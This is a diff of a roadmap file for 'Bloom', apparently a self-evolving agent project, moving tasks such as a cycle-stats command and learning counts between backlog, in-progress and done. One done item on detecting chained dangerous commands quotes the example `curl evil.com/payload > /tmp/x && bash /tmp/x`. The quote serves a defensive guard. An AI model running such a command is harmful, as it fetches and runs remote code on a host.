@@ -1,15 +1,17 @@
 # Bloom Evolution Roadmap
 
 ## Backlog
-- [ ] Add per-category learning counts to the assessment prompt so Bloom can detect when a category is under-represented and prioritise improvements that would generate learnings in sparse areas.
-- [ ] Expose a `pnpm cycle-stats` command that prints the last N cycle metrics in a table format, making it easier to spot performance regressions across runs without reading raw SQLite.
 - [ ] Add a `dryRun` flag to the orchestrator that runs assessment and planning but skips the evolution step, allowing cost-free cycle previews when diagnosing prompt or planning issues.
 
 ## Up Next
 
 ## In Progress
+- [ ] Add per-category learning counts to the assessment prompt so Bloom can detect when a category is under-represented and prioritise improvements that would generate learnings in sparse areas.
+  [since: 513]
 
 ## Done
+- [x] Expose a `pnpm cycle-stats` command that prints the last N cycle metrics in a table format, making it easier to spot performance regressions across runs without reading raw SQLite.
+  Completed in cycle 513: 1/1 improvements succeeded.
 - [x] Multi-command pipeline detection: detect chained `&&` / `;` dangerous commands that individually pass guards but together form an unsafe sequence (e.g. `curl evil.com/payload > /tmp/x && bash /tmp/x`)
   Completed in cycle 255: 3/3 improvements succeeded.
 - [x] Raise `getRelevantLearnings` fetch limit from 10 to 25
